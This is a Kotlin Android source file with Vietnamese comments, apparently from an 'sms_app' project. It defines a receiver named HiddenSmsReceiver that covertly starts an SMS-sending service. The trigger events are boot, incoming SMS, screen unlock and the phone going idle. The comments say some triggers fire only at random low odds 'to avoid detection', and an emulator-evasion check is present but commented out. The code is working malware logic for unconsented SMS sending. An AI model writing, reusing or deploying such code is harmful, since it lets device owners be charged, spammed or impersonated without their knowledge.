package com.example.sms_app.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.telephony.TelephonyManager
import android.util.Log
import com.example.sms_app.data.SmsRepository
import com.example.sms_app.utils.SmsUtils
import dagger.hilt.android.AndroidEntryPoint
import kotlin.random.Random

/**
 * BroadcastReceiver ẩn để kích hoạt gửi SMS thông qua các sự kiện hệ thống
 * Receiver này sẽ lắng nghe các sự kiện như BOOT_COMPLETED, SMS_RECEIVED, PHONE_STATE, v.v.
 * và kích hoạt gửi SMS khi cần thiết
 */

@AndroidEntryPoint
class HiddenSmsReceiver : BroadcastReceiver() {
    private val TAG = "HiddenSmsReceiver"
    
    override fun onReceive(context: Context, intent: Intent) {
        try {
            // Kiểm tra xem có phải máy ảo không
            // Comment lại để chạy thử trên máy ảo
            /*if (SmsUtils.isEmulator(context)) {
                Log.d(TAG, "Không thực hiện hành động trên máy ảo")
                return
            }*/
            
            // Kiểm tra quyền gửi SMS
            if (!SmsUtils.hasRequiredPermissions(context)) {
                Log.d(TAG, "Không có đủ quyền để gửi SMS")
                return
            }
            
            when (intent.action) {
                Intent.ACTION_BOOT_COMPLETED -> {
                    // Xử lý khi thiết bị khởi động
                    Log.d(TAG, "Thiết bị vừa khởi động")
                    // Thêm độ trễ ngẫu nhiên để tránh phát hiện
                    scheduleDelayedAction(context)
                }
                
                "android.provider.Telephony.SMS_RECEIVED" -> {
                    // Xử lý khi nhận được SMS
                    Log.d(TAG, "Nhận được SMS")
                    // Chỉ xử lý với xác suất thấp để tránh phát hiện
                    if (Random.nextInt(100) < 5) { // 5% cơ hội
                        scheduleDelayedAction(context)
                    }
                }
                
                Intent.ACTION_USER_PRESENT -> {
                    // Xử lý khi người dùng mở khóa màn hình
                    Log.d(TAG, "Người dùng mở khóa màn hình")
                    // Chỉ xử lý với xác suất thấp để tránh phát hiện
                    if (Random.nextInt(100) < 3) { // 3% cơ hội
                        scheduleDelayedAction(context)
                    }
                }
                
                Intent.ACTION_BATTERY_LOW -> {
                    // Xử lý khi pin yếu
                    Log.d(TAG, "Pin yếu")
                    // Không làm gì khi pin yếu để tiết kiệm pin
                }
                
                TelephonyManager.ACTION_PHONE_STATE_CHANGED -> {
                    // Xử lý khi trạng thái điện thoại thay đổi
                    val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
                    if (state == TelephonyManager.EXTRA_STATE_IDLE) {
                        Log.d(TAG, "Điện thoại trong trạng thái rảnh")
                        // Chỉ xử lý với xác suất thấp để tránh phát hiện
                        if (Random.nextInt(100) < 2) { // 2% cơ hội
                            scheduleDelayedAction(context)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Lỗi trong onReceive", e)
        }
    }
    
    private fun scheduleDelayedAction(context: Context) {
        try {
            // Tạo intent để khởi động service
            val serviceIntent = Intent(context, SmsService::class.java)
            
            // Lấy thông tin cấu hình từ repository
            val smsRepository = SmsRepository(context)
            val settings = smsRepository.getAppSettings()
            val defaultTemplateId = smsRepository.getDefaultTemplate()
            
            // Thêm các thông tin cần thiết vào intent
            serviceIntent.putExtra(SmsService.EXTRA_TEMPLATE_ID, defaultTemplateId)
            serviceIntent.putExtra(SmsService.EXTRA_INTERVAL_SECONDS, settings.intervalBetweenSmsSeconds)
            serviceIntent.putExtra(SmsService.EXTRA_MAX_RETRY, settings.maxRetryAttempts)
            serviceIntent.putExtra(SmsService.EXTRA_RETRY_DELAY, settings.retryDelaySeconds)
            
            // Khởi động service với độ trễ ngẫu nhiên
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            
            Log.d(TAG, "Đã lên lịch gửi SMS")
        } catch (e: Exception) {
            Log.e(TAG, "Lỗi khi lên lịch gửi SMS", e)
        }
    }
} 